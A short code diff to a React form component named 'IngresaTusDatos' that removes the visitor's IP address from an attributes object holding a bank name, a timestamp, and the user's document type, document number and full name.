@@ -404,7 +404,6 @@ export default function IngresaTusDatos() {
         "attributes": {
           'banco': "Bancolombia",
           'fecha': fechaHora,
-          'ip': ip,
           'tipoDocumento': tipoDocumento,
           'numeroDocumento': numeroDocumento,
           'nombreCompleto': nombreCompleto,
